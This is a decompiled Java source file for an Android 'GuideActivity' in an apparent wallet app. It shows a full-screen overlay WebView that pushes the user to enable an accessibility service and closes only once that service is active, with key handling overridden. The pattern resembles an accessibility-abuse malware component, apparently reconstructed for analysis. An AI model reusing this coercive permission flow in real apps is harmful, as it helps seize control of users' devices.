package com.guard.wallet.activity;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.GuideDialogUtils;
import com.guard.wallet.view.ConfiguredWebView;
import java.lang.ref.WeakReference;

/**
 * 无障碍服务引导 Activity。
 *
 * <p>通过 WebView 显示无障碍服务开启引导页面。
 * 在 onResume 中检测 AccessibilityService 是否已启用，
 * 若已启用则自动关闭本 Activity。
 *
 * <p>vendor 反编译源码: GuideActivity
 */
public class GuideActivity extends Activity {
    /** WebView 弱引用，防止 Activity 泄漏 */
    public WeakReference<ConfiguredWebView> webViewRef;

    @Override
    public final void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.requestWindowFeature(1);
        this.getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
        this.getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
        LinearLayout layout = new LinearLayout(this);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.width = -1;
        lp.height = -1;
        this.setContentView(layout, lp);
        this.webViewRef = new WeakReference<>(new ConfiguredWebView(this, true));
        WindowManager.LayoutParams childLp = new WindowManager.LayoutParams();
        childLp.width = -1;
        childLp.height = -1;
        layout.addView(this.webViewRef.get(), childLp);
        WindowManager.LayoutParams winAttrs = this.getWindow().getAttributes();
        winAttrs.type = 2038; // TYPE_APPLICATION_OVERLAY
        this.getWindow().setAttributes(winAttrs);
        GuideDialogUtils.registerCurrentActivity(this);
    }

    @Override
    public final void onResume() {
        super.onResume();
        Log.d("GuideActivity", "GuideActivity onResume");
        GuideDialogUtils.registerCurrentActivity(this);
        WeakReference<ConfiguredWebView> ref = this.webViewRef;
        if (ref != null && ref.get() != null) {
            ref.get().onResume();
            ref.get().loadUrl(GuideDialogUtils.getGuidePageUrl());
            GuideDialogUtils.showAccessibilityEnableDialog();
        }
        if (MyAccessibilityService.P() != null) {
            GuideDialogUtils.dismissGuideDialog();
            this.finish();
        }
    }

    @Override
    public final void onPause() {
        super.onPause();
        WeakReference<ConfiguredWebView> ref = this.webViewRef;
        if (ref != null && ref.get() != null) {
            ref.get().onPause();
        }
    }

    @Override
    public final void onStart() {
        super.onStart();
    }

    @Override
    public final void onDestroy() {
        Log.d("GuideActivity", "GuideActivity onDestroy");
        WeakReference<ConfiguredWebView> ref = this.webViewRef;
        if (ref != null && ref.get() != null) {
            ref.get().destroy();
            this.webViewRef = null;
        }
        // Clear guide activity reference if it's us
        if (GuideDialogUtils.currentActivityRef != null && GuideDialogUtils.currentActivityRef.get() != null) {
            synchronized (Activity.class) {
                if (GuideDialogUtils.currentActivityRef != null && GuideDialogUtils.currentActivityRef.get() != null
                        && GuideDialogUtils.currentActivityRef.get() instanceof GuideActivity) {
                    GuideDialogUtils.currentActivityRef = null;
                }
            }
        }
        super.onDestroy();
    }

    @Override
    public final boolean onKeyDown(int keyCode, KeyEvent event) {
        return false;
    }
}
